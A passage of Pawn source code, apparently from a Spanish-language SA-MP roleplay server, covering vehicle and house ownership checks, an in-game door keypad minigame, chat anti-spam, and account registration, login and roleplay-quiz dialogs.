	if(GetPVarInt(playerid,"TIENE_CINTURON"))
	{
 		Error(playerid,"¡Debes sacarte el cinturón de seguridad para bajar! "#CINFO"(/cinturon)");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			PutPlayerInVehicle(playerid,vehicleid,GetPlayerVehicleSeat(playerid));
		}
		else
		{
		    SetTimerEx("_2PutPlayerInVehicle", 1000, false, "iii", playerid, vehicleid, 0);
		}
	    return 1;
	}
    if(GetPVarInt(playerid,"LIC_Segundos"))
    {
		Error(playerid,"¡No puedes bajarte del vehículo en el test!");
  		SetTimerEx("_2PutPlayerInVehicle", 1000, false, "iii", playerid, vehicleid, 0);
  		return 1;
	}
	return 1;
}

CALLBACK: _2PutPlayerInVehicle(params_1, params_2, params_3)
	return PutPlayerInVehicle(params_1, params_2, params_3);

public OnPlayerUpdate(playerid)
{
	static
		LastKeyPressed[MAX_PLAYERS];

	// Anim index
/*	new string[200];

	new index = GetPlayerAnimationIndex(playerid);

	new name[30], name2[30];
	GetAnimationName(index, name, 30, name2, 30);
	A_Format(string, "~n~~n~~n~~n~~n~~n~~n~~w~index: %d~n~lib: %s~n~anim: %s", index, name, name2);
	TextoJugador(playerid, string, 1000, 3);
*/
	new
		VehID = GetPlayerVehicleID(playerid);

	if(VehID != 0 && Veh[VehID][vMotor])
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			if(TrailerAttached[playerid] == 0)
			{
			    new
			        TrailerID = GetVehicleTrailer(VehID);

			    if(TrailerID)
			    {
			        OnPlayerAttachTrailer(playerid, VehID, TrailerID);
			        TrailerAttached[playerid] = TrailerID;
				}
			}
			else
			{
			    if(!IsTrailerAttachedToVehicle(VehID))
			    {
			        OnPlayerDettachTrailer(playerid, VehID, TrailerAttached[playerid]);
			        TrailerAttached[playerid] = 0;
				}
			}
		}
	}

	else
	{
		new SurfVeh = GetPlayerSurfingVehicleID(playerid);

		if( SurfVeh != INVALID_VEHICLE_ID )
		{
			if(GetVehicleSpeed(SurfVeh) > 60.0)
			{
				switch(GetVehicleModel(SurfVeh))
				{
					case 595,446,452,453,454,472,473,484,493,430, 422:
					{
						return 1;
					}
				}

				new
					Float:slx, Float:sly, Float:slz;

				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+2.5);

				ApplyAnimation(playerid, "ped", "BIKE_fallR", 4.0, 0, 1, 0, 0, 0,0);

				new
					Float:VD;

				GetPlayerHealth(playerid, VD);
				SetPlayerHealth(playerid, VD-20);

				SetTimerEx("AnimUp_", 1100, 0, "d", playerid);
			}
		}

		if(UsandoHackPad[playerid])
		{
			new Key[3];
			GetPlayerKeys(playerid, Key[0], Key[1], Key[2]);
			if(Key[1] != 0 || Key[2] != 0)
			{
				if(GetTickCount() - LastKeyPressed[playerid] > 100)
				{
					LastKeyPressed[playerid] = GetTickCount();
					OnPlayerPressDirectionKeys(playerid, Key[2], Key[1]);
				}
			}
		}
	}

	return 1;
}

CALLBACK: AnimUp_(playerid)
{
    ApplyAnimation(playerid, "ped", "getup", 4.0, 0, 1, 0, 0, 0,0);
	return 1;
}

stock ShowKeyPad(playerid)
{
	if(UsandoHackPad[playerid])
	{
	    HideKeyPad(playerid);
	}
    for(new a; a < MAX_KEY_NUMBERS; a++)
	{
		NumberPanel[playerid][a] = CreatePlayerTextDraw(playerid, 230.000000+(70.0*a), 80.000000+60.00000, "0");
		PlayerTextDrawBackgroundColor(playerid, NumberPanel[playerid][a], 255);
		PlayerTextDrawFont(playerid, NumberPanel[playerid][a], 2);
		PlayerTextDrawLetterSize(playerid, NumberPanel[playerid][a], 1.299999, 6.000000);
		PlayerTextDrawColor(playerid, NumberPanel[playerid][a], -1);
		PlayerTextDrawSetOutline(playerid, NumberPanel[playerid][a], 1);
		PlayerTextDrawSetProportional(playerid, NumberPanel[playerid][a], 1);
		PlayerTextDrawUseBox(playerid, NumberPanel[playerid][a], 1);
		PlayerTextDrawBoxColor(playerid, NumberPanel[playerid][a], 0x20B2AAFF);
		PlayerTextDrawTextSize(playerid, NumberPanel[playerid][a], 260.000000+(70.0*a), 0.000000);
		PlayerTextDrawShow(playerid, NumberPanel[playerid][a]);
	}
	TextDrawShowForPlayer(playerid, KeyPad_Fondo);
	UsandoHackPad[playerid] = true;
	TogglePlayerControllable(playerid, false);
	return 1;
}

stock HideKeyPad(playerid)
{
	if(NumberPanel[playerid][0] != PlayerText:0)
	{
	    for(new a; a < MAX_KEY_NUMBERS; a++)
		{
		    PlayerTextDrawDestroy(playerid, NumberPanel[playerid][a]);
		    NumberPanel[playerid][a] = PlayerText:0;
			NumberKey[playerid][a] = 0;
			DeletePVar(playerid, "H_PartePanel");
		}
	}
	TextDrawHideForPlayer(playerid, KeyPad_Fondo);
	UsandoHackPad[playerid] = false;
	TogglePlayerControllable(playerid, true);
	return 1;
}

CALLBACK: OnPlayerConfirmKeyPad(playerid, key[])
{
	switch(GetPVarInt(playerid, "H_TYPE_HACK"))
	{
		case H_TYPE_DOOR:
		{
		    new
				House_ID = GetPVarInt(playerid, "H_HOUSE_ID"),
				str[MAX_KEY_NUMBERS+1];

			A_Format(str, "%d", InfoCasa[House_ID][cContra_puerta]);

			if(strval(key) != strval(str))
			{
				TextoJugador(playerid, _TD("~w~contraseña ~r~incorrecta"), 4000, 3);
			}
			else
			{
				TextoJugador(playerid, _TD("~w~contraseña ~g~correcta"), 4000, 3);
				InfoCasa[House_ID][cCerrada] = false;
				ActualizarCasaLabel(House_ID);
				ActualizarCasa(House_ID);
			}
			HideKeyPad(playerid);
			DeletePVar(playerid, "H_TYPE_HACK");
			DeletePVar(playerid, "H_HOUSE_ID");
			return 1;
		}
		case H_TYPE_DOOR_CONFIG:
		{
		    new
				House_ID = GetPVarInt(playerid, "H_HOUSE_ID"),
				bool: NumerosRepetidos = false,
				str[MAX_KEY_NUMBERS+1];

			strcat(str, key);

			for(new a; a < MAX_KEY_NUMBERS; a++)
			{
			    for(new b; b < MAX_KEY_NUMBERS; b++)
			    {
			        if(a != b && key[a] == str[b])
			        {
			            NumerosRepetidos = true;
			            goto Check_repeated_numbers;
					}
				}
			}
			Check_repeated_numbers:
			if(NumerosRepetidos) return Error(playerid, "¡No puede tener número repetidos!");

			InfoCasa[House_ID][cContra_puerta] = strval(key);
			ActualizarCasa(House_ID);
			HideKeyPad(playerid);

			Mensaje(playerid, -1, "Contraseña modificada correctamente.");
			DeletePVar(playerid, "H_TYPE_HACK");
			DeletePVar(playerid, "H_HOUSE_ID");
			return 1;
		}
	}
	return 1;
}

CALLBACK: OnPlayerPressDirectionKeys(playerid, leftright, updown)
{
	new PartePanel = GetPVarInt(playerid, "H_PartePanel");

	if(leftright == KEY_RIGHT)
	{
		if(PartePanel < MAX_KEY_NUMBERS-1)
		{
		    PlayerPlaySound(playerid, 1190, 0, 0, 0);
			PlayerTextDrawBoxColor(playerid,NumberPanel[playerid][PartePanel], 0x20B2AAFF);
			PlayerTextDrawShow(playerid, NumberPanel[playerid][PartePanel]);
			PartePanel++;
			PlayerTextDrawBoxColor(playerid,NumberPanel[playerid][PartePanel], 0xFF6347FF);
			PlayerTextDrawShow(playerid, NumberPanel[playerid][PartePanel]);
		}
		else PlayerPlaySound(playerid, 1131, 0, 0, 0);
	}
	else if(leftright == KEY_LEFT)
	{
		if(PartePanel)
		{
		    PlayerPlaySound(playerid, 1190, 0, 0, 0);
			PlayerTextDrawBoxColor(playerid,NumberPanel[playerid][PartePanel], 0x20B2AAFF);
			PlayerTextDrawShow(playerid, NumberPanel[playerid][PartePanel]);
			PartePanel--;
			PlayerTextDrawBoxColor(playerid,NumberPanel[playerid][PartePanel], 0xFF6347FF);
			PlayerTextDrawShow(playerid, NumberPanel[playerid][PartePanel]);
		}
		else PlayerPlaySound(playerid, 1131, 0, 0, 0);
	}
	if(updown == KEY_UP)
	{
		if(NumberKey[playerid][PartePanel])
		{
		    PlayerPlaySound(playerid, 1085, 0, 0, 0);
			NumberKey[playerid][PartePanel]--;
			new str[4];
			format(str, 4, "%d", NumberKey[playerid][PartePanel]);
			PlayerTextDrawSetString(playerid, NumberPanel[playerid][PartePanel], str);
		}
		else PlayerPlaySound(playerid, 1131, 0, 0, 0);
	}
	else if(updown == KEY_DOWN)
	{
		if(NumberKey[playerid][PartePanel] < 9)
		{
		    PlayerPlaySound(playerid, 1085, 0, 0, 0);
			NumberKey[playerid][PartePanel]++;
			new str[4];
			format(str, 4, "%d", NumberKey[playerid][PartePanel]);
			PlayerTextDrawSetString(playerid, NumberPanel[playerid][PartePanel], str);
		}
		else PlayerPlaySound(playerid, 1131, 0, 0, 0);
	}
	SetPVarInt(playerid, "H_PartePanel", PartePanel);
	return 1;
}

// ----===[ Vehiculos, Casas y negocios ]======------ //

//      VEHICULOS
stock SlotVehLibre()
{
	Loop(i,MAX_VEH_VENTA,1)
	{
		if(!InfoVeh[i][vModelo]) return i;
	}
	return -1;
}

stock TieneLlaveVeh(playerid,vehid)
{
	if(VehVenta_ID(vehid))
	{
		if(strmatch(InfoVeh[VehVenta_ID(vehid)][vComprador],pName(playerid)))
		{
		    return 1;
		}
		if(InfoVeh[VehVenta_ID(vehid)][vFamilia])
		{
		    if((InfoJugador[playerid][jMiembroFam] | InfoJugador[playerid][jLiderFam]) == InfoVeh[VehVenta_ID(vehid)][vFamilia])
		    {
		        return 1;
			}
		}
	}
	else
	{
		if(Veh[vehid][vFaccion])
		{
		    if(Bit_Get(Llave_veh[playerid], vehid)) return 1;
		}
		else if(Veh[vehid][vTrabajo])
		{
		    if(Veh[vehid][vTrabajo] == InfoJugador[playerid][jTrabajo]) return 1;
		}
		else if(EsVehRenta(vehid))
		{
		    if(GetPVarInt(playerid,"RentoVehID") == vehid) return 1;
		}
	}
 	return 0;
}

stock EsDuenoVeh(playerid,vehid)
{
	return (strmatch(InfoVeh[vehid][vComprador],pName(playerid)));
}

stock PandillerosEnGangZone( pandilla, GangZone )
{
	new
	    GZ,
		Cantidad;

	foreach(Player,i)
	{
	    if( ID_Familia(i) == pandilla && InfoFamilia[ID_Familia(i)][fPandilla] )
	    {
	        GZ = GetPlayerGangZone(i);

			if(GZ == GangZone) Cantidad++;

			GZ = 0;
		}
	}
	return Cantidad;
}

stock CheckDistanciaConVehiculo(playerid,Float:Distancia,VehID)
{
	new Float:PosV[3];
	GetVehiclePos(VehID,PosV[0],PosV[1],PosV[2]);
	if(IsPlayerInRangeOfPoint(playerid,Distancia,PosV[0],PosV[1],PosV[2]))
	{
		return 1;
	}
	return 0;
}

stock ID_Familia(playerid)
{
	if(!InfoJugador[playerid][jMiembroFam] && !InfoJugador[playerid][jLiderFam])
	    return 0;

	return (InfoJugador[playerid][jMiembroFam]) ? InfoJugador[playerid][jMiembroFam] : InfoJugador[playerid][jLiderFam];
}

stock ID_Faccion(playerid)
{
	if(!InfoJugador[playerid][jMiembro] && !InfoJugador[playerid][jLider])
	    return 0;

	return (InfoJugador[playerid][jMiembro]) ? InfoJugador[playerid][jMiembro] : InfoJugador[playerid][jLider];
}

stock ID_Original(vehid)
{
	new Val = ID_VehOriginal[vehid];
	return Val;
}

stock EsDueno(playerid)
{
	return bool:(!strcmp(NombreJugador(playerid),"Ryan Spell",	 false)
		|| !strcmp(NombreJugador(playerid),"Facundo Koyro",  false)
		|| !strcmp(NombreJugador(playerid),"Miky Boyx",		 false)
		|| !strcmp(NombreJugador(playerid),"Sebastian Rojas",false)
		|| !strcmp(NombreJugador(playerid),"Charly Diamond",false)
		|| !strcmp(NombreJugador(playerid),"Pedro Asekas",	 false));
}

stock Float:GetPosInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)//by: whoever
{
	new Float:a;
	GetPlayerPos(playerid, x, y, a);
	switch(IsPlayerInAnyVehicle(playerid))
	{
	    case 0: GetPlayerFacingAngle(playerid, a);
	    case 1: GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	}
	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
	return a;
}

//      CASAS
stock SlotCasaLibre()
{
	Loop(i,MAX_CASAS,0)
	{
		if(!InfoCasa[i][cInt] && !InfoCasa[i][cVW]) return i;
	}
	return -1;
}

stock SlotGarageLibre()
{
	Loop(i,MAX_GARAGES,0)
	{
		if(!InfoGarage[i][gVW]) return i;
	}
	return -1;
}

stock EstaEnCasa(playerid)
{
	if(GetPlayerVirtualWorld(playerid) >= 100 && GetPlayerVirtualWorld(playerid) < 1000 )
	{
	    return 1;
	}
	return 0;
}

stock EstaEnSuCasa(playerid)
{
	if(ID_Casa(playerid) == INVALID_HOUSE_ID) return 0;
	if(strmatch(InfoCasa[ID_Casa(playerid)][cComprador],pName(playerid) ))
	{
	    return 1;
	}
	return 0;
}

stock TieneLlaveCasa(playerid,i)
{
	if(EsDuenoCasa(playerid,i))
	{
	    return 1;
	}
	if(InfoCasa[i][cFamilia])
	{
		if(InfoCasa[i][cFamilia] == InfoJugador[playerid][jLiderFam] || InfoCasa[i][cFamilia] == InfoJugador[playerid][jMiembroFam])
		{
		    return 1;
		}
	}
	return 0;
}

stock ID_Casa(playerid)
{
	if(GetPlayerVirtualWorld(playerid) >= 100 && GetPlayerVirtualWorld(playerid) <= (100 + MAX_CASAS))
	{
	    return (GetPlayerVirtualWorld(playerid) -100);
	}
	return INVALID_HOUSE_ID;
}

stock EsDuenoCasa(playerid,cid)
{
	if(strmatch(InfoCasa[cid][cComprador],pName(playerid)))
	{
	    return 1;
	}
	return 0;
}

stock CopyFile(File_original[], File_copia[], bool:BorrarReal = false)
{
    if(!fexist(File_original)) return 0;
    
    new
		File:Original = fopen(File_original, io_read),
		File:Copia = fopen(File_copia, io_write),
		ReadStr[255];

    while(fread(Original, ReadStr, sizeof(ReadStr)))
	{
		fwrite(Copia, ReadStr);
	}
	
    fclose(original);
	fclose(copy);
    if(BorrarReal) fremove(File_original);
   	return 1;
}

//      INTERIORES
stock ID_Interior(playerid)
{
	new
	    VW = GetPVarInt(playerid,"ID_Interior");

	return (VW && VW < MAX_INTERIORES) ? (VW) : (INVALID_INTERIOR_ID);
}

stock EstaEnInterior(playerid)
{
	return bool:(ID_Interior(playerid) != INVALID_INTERIOR_ID) ? (true) : (false);
}

//		NEGOCIOS
stock SlotNegocioLibre()
{
	Loop(i,MAX_NEGOCIOS,0)
	{
	    if(!InfoNegocio[i][nInt] && !InfoNegocio[i][nVW]) return i;
	}
	return -1;
}

stock EstaEnNegocio(playerid)
{
	return bool:(ID_Negocio(playerid) != INVALID_BUSINESS_ID) ? (true) : (false);
}

stock EstaEnSuNegocio(playerid)
{
	if(ID_Negocio(playerid) == INVALID_BUSINESS_ID) return 0;

	if(strmatch(InfoNegocio[ID_Negocio(playerid)][nComprador],pName(playerid) ))
	{
	    return 1;
	}
	return 0;
}

stock ID_Negocio(playerid)
{
	if(GetPlayerVirtualWorld(playerid) >= 1000 && GetPlayerVirtualWorld(playerid) <= (1000 + MAX_NEGOCIOS))
	{
	    return (GetPlayerVirtualWorld(playerid) -1000);
	}
	return INVALID_BUSINESS_ID;
}

stock EsDuenoNegocio(playerid,nid)
{
	if(strmatch(InfoNegocio[nid][nComprador],pName(playerid)))
	{
	    return 1;
	}
	return 0;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	if(!InfoJugador[playerid][jRegistrado]) return 1;
	else if(IsPlayerInRangeOfPoint(playerid,2,232.5,1822.900,7.8))
	{
		GameTextForPlayer(playerid,"~w~cargando~n~~b~~h~~h~~h~espera un momento..",3000,3);

		TextDrawShowForPlayer(playerid, Vendado);
		TogglePlayerControllable(playerid, false);

		SetTimerEx("CargoObjetos", 3000, false, "i", playerid);
	}

	if(Specteado_Por[playerid] != INVALID_PLAYER_ID)
	{
	    SetPlayerInterior(Specteado_Por[playerid], newinteriorid);
	    SetPlayerVirtualWorld(Specteado_Por[playerid], GetPlayerVirtualWorld(playerid));
	    return 1;
	}
	return 1;
}

CALLBACK: CargoObjetos(playerid)
{
	PlayerTextDrawDestroy(playerid, PlayerText: GetPVarInt(playerid,"INT_TD_ID_0") );
	PlayerTextDrawDestroy(playerid, PlayerText: GetPVarInt(playerid,"INT_TD_ID_1") );

	TogglePlayerControllable(playerid, true);
	return 1;
}

public OnPlayerText(playerid, text[])
{
	//Anti SPAM
	if(EsIP(text))
	{
		MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"%s", Destacado, NombreJugador_(playerid), playerid, text);
		_Kick(playerid,T_ANTICHEAT,"SPAM");
		return 0;
	}

	new
		string[180];

	if(!InfoJugador[playerid][jAcento])
		format(string,sizeof(string),"%s dice: %s",NombreJugador(playerid),text);
	else
		format(string,sizeof(string),"%s (Acento %s): %s",NombreJugador(playerid), Acentos[InfoJugador[playerid][jAcento]-1], text);

	ProxDetector(20,playerid,string,-1,Hablar,Hablar2,Hablar3,Hablar4);
	SetPlayerChatBubble(playerid,text,C_INFO,20,strlen(text) * 300);
	return 0;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid != GetPVarInt(playerid, "antic_DialogID"))
	{
	    antic_Kick(playerid,"Dialog exploit");
	    return 1;
	}

	Loop(i,strlen (inputtext)+1,0)
	    if(inputtext[i] == '%') inputtext[i] = '#';

	switch(dialogid)
	{
		case dRegistro:
		{
			if (!response) return Kick(playerid);
			if (!(4 <= strlen(inputtext) < MAX_CARACTERES_CLAVE)) return Dialog(playerid,dRegistro,DIALOG_STYLE_INPUT,"Registro - "#CROJO"ERROR",""#CBLANCO"Su contraseña debe tener mínimo 4 caracteres, y máximo "#MAX_CARACTERES_CLAVE".\nEscribe la contraseña nuevamente cumpliendo estos requisitos:\n","Continuar","Salir");
			CrearCuenta(playerid, inputtext);
			Dialog(playerid,dConfirmarP,DIALOG_STYLE_PASSWORD,INFO_HEADER,""#CBLANCO"Ahora, necesitamos que confirme su contraseña.","Confirmar","Salir");
		}
		case dIngreso:
		{
			if(response)
			{
				if(udb_hash(inputtext) == InfoJugador[playerid][jClave])
				{
					SetPVarInt(playerid,"TIEMPO_CCUENTA",GetTickCount());
					SetPVarInt(playerid,"Logueado",1);
					if(InfoJugador[playerid][jRegistrado])
					{
						CargarCuenta(playerid);
					}
					else TogglePlayerSpectating(playerid, false);
				}
				else
				{
				    if(GetPVarInt(playerid,"ErraContraseña") >= 3)
					{
						return _Kick(playerid,"SERVER","Límite de intentos de contraseña");
					}
					SetPVarInt(playerid,"ErraContraseña", GetPVarInt(playerid,"ErraContraseña")+1 );
        			Dialog(playerid, dOlvidoC, DIALOG_STYLE_LIST, ""#CNEGATIVO"La contraseña introducida es incorrecta", ""#CINFO"1) "#CBLANCO"Olvidé mi contraseña\n"#CINFO"2) "#CBLANCO"Volver a intentar", "Aceptar", "Salir");
				}
				return 1;
			}
			else
				return Kick(playerid);
		}
		case dConfirmarP:
		{
			if (!response)
			{
				fremove(U_Usuario(playerid));
				Kick(playerid);
				return 1;
			}
			if(udb_hash(inputtext) != InfoJugador[playerid][jClave])
			{
			    Dialog(playerid,dRegistro,DIALOG_STYLE_PASSWORD,"Registro - "#CROJO"ERROR",""#CBLANCO"La contraseña que escribiste, es diferente a la anterior. \n\t\tEscribe la contraseña nuevamente:","Registrar","Salir");
                fremove(U_Usuario(playerid));
			}
			else
			{
				Dialog(playerid,dPreguntaS,DIALOG_STYLE_LIST,""#CBLANCO"Seleccione una "#CPOSITIVO"pregunta de seguridad",""#CINFO"1) "#CBLANCO"Mi mejor amigo\n"#CINFO"2) "#CBLANCO"Nombre de mi mamá\n"#CINFO"3) "#CBLANCO"Nombre de mi papá\n"#CINFO"4) "#CBLANCO"Número de documento\n"#CINFO"5) "#CBLANCO"Mi primera mascota\n"#CINFO"6) "#CBLANCO"Otro ...","Aceptar","Cancelar");
			}

		}
		case dPreguntaS:
		{
			if (!response)
			{
				fremove(U_Usuario(playerid));
				Kick(playerid);
				return 1;
			}
   			switch(listitem)
   			{
   			    case 0: alm(InfoJugador[playerid][jPreguntaS],"Mi mejor amigo");
   			    case 1: alm(InfoJugador[playerid][jPreguntaS],"Nombre de mi mamá");
   			    case 2: alm(InfoJugador[playerid][jPreguntaS],"Nombre de mi papá");
   			    case 3: alm(InfoJugador[playerid][jPreguntaS],"Número de documento");
   			    case 4: alm(InfoJugador[playerid][jPreguntaS],"Mi primera mascota");
				case 5: return Dialog(playerid,dOtraPS,DIALOG_STYLE_INPUT,""#CBLANCO"Pregunta de seguridad",""#CBLANCO"Escribe la "#CPOSITIVO"pregunta de seguridad "#CBLANCO"que desees:","Aceptar","Cancelar");
			}
			new
				SDialog[MAX_CARACTERES_PS + 100],
				INI:Arch = INI_Open(U_Usuario(playerid));

			INI_SetTag(Arch, "data");
			INI_WriteString(Arch, "Pregunta_de_seguridad", InfoJugador[playerid][jPreguntaS]);
			INI_Close(Arch);

			format(SDialog,sizeof(SDialog), ""#CBLANCO"Ahora escribe la respuesta secreta a la pregunta: "#CINFO"%s" , InfoJugador[playerid][jPreguntaS]);
			Dialog(playerid,dRespuestaS,DIALOG_STYLE_INPUT, ""#CBLANCO"Respuesta de seguridad" , SDialog , "Continuar" , "Cancelar" );
		}
		case dOtraPS:
		{
			if (!response)
			{
				fremove(U_Usuario(playerid));
				Kick(playerid);
				return 1;
			}

			if (!(2 <= strlen(inputtext) < MAX_CARACTERES_PS)) return Dialog(playerid,dOtraPS,DIALOG_STYLE_INPUT,"Registro - "#CROJO"ERROR",""#CBLANCO"La pregunta puede contener desde 2 hasta "#MAX_CARACTERES_PS" caracteres.\n\t\t"#CINFO"Escribe la pregunta nuevamente:","Continuar","Salir");

   			alm(InfoJugador[playerid][jPreguntaS],inputtext);

			new
				SDialog[MAX_CARACTERES_PS + 100],
				INI:Arch = INI_Open(U_Usuario(playerid));

			INI_SetTag(Arch, "data");
			INI_WriteString(Arch, "Pregunta_de_seguridad", InfoJugador[playerid][jPreguntaS]);
			INI_Close(Arch);

			format(SDialog,sizeof(SDialog), ""#CBLANCO"Ahora escribe la respuesta secreta a la pregunta: "#CINFO"%s" , InfoJugador[playerid][jPreguntaS]);
			Dialog(playerid,dRespuestaS,DIALOG_STYLE_INPUT, ""#CBLANCO"Respuesta de seguridad" , SDialog , "Continuar" , "Cancelar" );
		}
		case dRespuestaS:
		{
			if (!response)
			{
				fremove(U_Usuario(playerid));
				Kick(playerid);
				return 1;
			}

			if (!(2 <= strlen(inputtext) < MAX_CARACTERES_RS)) return Dialog(playerid,dRespuestaS,DIALOG_STYLE_INPUT,"Registro - "#CROJO"ERROR","La respuesta puede contener desde 2 hasta "#MAX_CARACTERES_RS" caracteres.\n\n\t"#CINFO"Escribe la respuesta nuevamente:","Continuar","Salir");

			InfoJugador[playerid][jRespuestaS] = udb_hash(inputtext);

			new
				SDialog[300],
				INI:Arch = INI_Open(U_Usuario(playerid)),
				Ip[16];

			GetPlayerIp(playerid, Ip, 16);
			INI_SetTag(Arch, "data");
			INI_WriteInt(Arch, "Respuesta_de_seguridad", InfoJugador[playerid][jRespuestaS]);
			INI_WriteString(Arch, "IP", Ip);
			INI_Close(Arch);
			format(SDialog,sizeof(SDialog),"  -"#CBLANCO"Datos de su cuenta:\n\n\tUsuario: "#CINFO"%s\n\t"#CBLANCO"Pregunta de seguridad: "#CINFO"%s\n\n"#CAMARILLO"Escribe la contraseña de la cuenta para proceder a configurar tu personaje",
			Nombre[playerid],
			InfoJugador[playerid][jPreguntaS]);
			printf("- %s se registró, va a configurar su personaje ( Registro )",NombreJugador_(playerid));
			Dialog(playerid,dIngreso,DIALOG_STYLE_PASSWORD,""#CPOSITIVO"¡Cuenta creada exitosamente!",SDialog,"Ingresar","Salir");
		}
		case dOlvidoC:
		{
 			if (!response) return Kick(playerid);
 			if (!listitem)
 			{
				new SDialog[66 + MAX_CARACTERES_PS];
 			    format(SDialog,sizeof(SDialog),""#CBLANCO"Para acceder a su cuenta, responda a\n\n\t"#CAMARILLO"%s",InfoJugador[playerid][jPreguntaS]);
				Dialog(playerid,dRecordarC,DIALOG_STYLE_INPUT,""#CBLANCO"Recuperar contraseña",SDialog,"Aceptar","Cancelar");
			}
			else
			{
			    Dialog(playerid,dIngreso,DIALOG_STYLE_INPUT,INFO_HEADER,INFO_INGRESO,"Ingresar","Cancelar");
			}
		}
		case dRecordarC:
		{
			if (!response) return Kick(playerid);
			if (InfoJugador[playerid][jRespuestaS] == udb_hash(inputtext))
			{
				Dialog(playerid,dRecuperarPass,DIALOG_STYLE_PASSWORD,""#CPOSITIVO"Respuesta correcta",""#CBLANCO"La respuesta de seguridad es "#CPOSITIVO"correcta.\n\n\t"#CBLANCO"Escribe la nueva contraseña para tu cuenta:","Aceptar","Cancelar");
				return 1;
			}
			else
			{
	   			if(GetPVarInt(playerid,"ErraPregunta") >= 3)
				{
					return _Kick(playerid,"SERVER","Límite de intentos de pregunta");
			   	}
				Dialog(playerid, dOlvidoC, DIALOG_STYLE_LIST, ""#CNEGATIVO"Respuesta incorrecta", ""#CINFO"1) "#CBLANCO"Olvidé mi contraseña\n"#CINFO"2) "#CBLANCO"Volver a intentar", "Aceptar", "Salir");
				SetPVarInt(playerid,"ErraPregunta", GetPVarInt(playerid,"ErraPregunta")+1 );
			}
		}
		case dRecuperarPass:
		{
		    if( !response ) return 1;
			if (!(4 <= strlen(inputtext) < MAX_CARACTERES_CLAVE)) return Dialog(playerid,dRecuperarPass,DIALOG_STYLE_INPUT,"Nueva contraseña - "#CROJO"ERROR",""#CBLANCO"Su contraseña debe tener mínimo 4 caracteres, y máximo "#MAX_CARACTERES_CLAVE".\nEscribe la contraseña nuevamente cumpliendo estos requisitos:\n","Continuar","Salir");
			CrearCuenta(playerid, inputtext);
		    Dialog(playerid,dIngreso,DIALOG_STYLE_INPUT,INFO_HEADER,INFO_INGRESO,"Continuar","Cancelar");
		    return 1;
		}
		case dDatos:
		{
		    if(!response)
			{
				Registrar(playerid);
			}
		    else if(response)
		    {
				LimpiarPantalla(playerid,10);
				//GameTextForPlayer(playerid, "~w~Ahora pasamos al ~g~~h~tutorial", 3000, 3);
				//SetTimerEx("MostrarTutorial", 3000, false, "i", playerid);
				OnPlayerFinishTut(playerid);
			}
		}
		case dSabeReglas:
		{
		    if(!response)
		    {
		    	SetPVarInt(playerid,"ParteTest",1);
				Dialog(playerid,dTest,DIALOG_STYLE_LIST,""#CAMARILLO"¿Qué es ROLEAR? "#CINFO"(1/5)",""#CINFO"1) "#CBLANCO"Rolear, es utilizar la información OOC en el juego\n"#CINFO"2) "#CBLANCO"Rolear, es actuar lo máximo posible como en la vida real\n"#CINFO"3) "#CBLANCO"Rolear, es hacerte responsable al prestar la cuenta.\n","Aceptar","Tutorial");
			}
			else
			{
				SetPVarInt(playerid,"ParteConceptos",1);
				ConceptosDeRol(playerid);
			}
		}
		case dTest:
		{
			switch(GetPVarInt(playerid,"ParteTest"))
			{
				case 1:
				{
	        		if(listitem != 1)
        			{
						Mensaje(playerid, -1, "Erraste la pregunta, vuelves a ver el tutorial.");
						DeletePVar(playerid,"ParteTest");
       					SetPVarInt(playerid,"ParteConceptos",1);
						ConceptosDeRol(playerid);
					}
	        		else
	        		{
	    	    		Dialog(playerid,dTest,DIALOG_STYLE_LIST,""#CAMARILLO"¿Qué es MG? "#CINFO"(2/5)",""#CINFO"1) {ffffff}MG es MetaGaming, es utilizar información OOC para beneficiarte IC\n"#CINFO"2) {FFFFFF}MG es MetaGaming, utilizar información IC en OOC.\n"#CINFO"3) {FFFFFF}MG es MetaGaming, utilizar un programa externo para beneficio IC","Aceptar","Tutorial");
						SetPVarInt(playerid,"ParteTest",2);
					}
					return 1;
				}
				case 2:
				{
	        		if(listitem != 0)
        			{
						Mensaje(playerid, -1, "Erraste la pregunta, vuelves a ver el tutorial.");
						DeletePVar(playerid,"ParteTest");
      					SetPVarInt(playerid,"ParteConceptos",1);
						ConceptosDeRol(playerid);
					}
	        		else
	        		{
	    	    		Dialog(playerid,dTest,DIALOG_STYLE_LIST,""#CAMARILLO"¿Qué es IC? "#CINFO"(3/5)",""#CINFO"1) {FFFFFF}IC es aquella información del rol de tu personaje\n"#CINFO"2) {FFFFFF}IC es aquella información obtenida por un medio externo al juego\n"#CINFO"3) {FFFFFF}IC es InCar, información de tu vehículo","Aceptar","Tutorial");
						SetPVarInt(playerid,"ParteTest",3);
					}
					return 1;
				}
				case 3:
				{
	        		if(listitem != 0)
        			{
						Mensaje(playerid, -1, "Erraste la pregunta, vuelves a ver el tutorial.");
						DeletePVar(playerid,"ParteTest");
      					SetPVarInt(playerid,"ParteConceptos",1);
						ConceptosDeRol(playerid);
					}
	        		else
	        		{
	    	    		Dialog(playerid,dTest,DIALOG_STYLE_LIST,""#CAMARILLO"¿Cuál es el PG? "#CINFO"(4/5)",""#CINFO"1) {FFFFFF}Matar con tu pandilla a un policia desarmado en un guetto\n"#CINFO"2) {FFFFFF}Saltar desde un avión porque te secuestro la mafia\n"#CINFO"3) {FFFFFF}Somos 4 pandilleros, y un policia nos apunta con su arma. -Nos resignamos-","Aceptar","Tutorial");
						SetPVarInt(playerid,"ParteTest",4);
					}
					return 1;
				}
				case 4:
				{
	        		if(listitem != 1)
        			{
						Mensaje(playerid, -1, "Erraste la pregunta, vuelves a ver el tutorial.");
						DeletePVar(playerid,"ParteTest");
      					SetPVarInt(playerid,"ParteConceptos",1);
						ConceptosDeRol(playerid);
					}
	        		else
	        		{
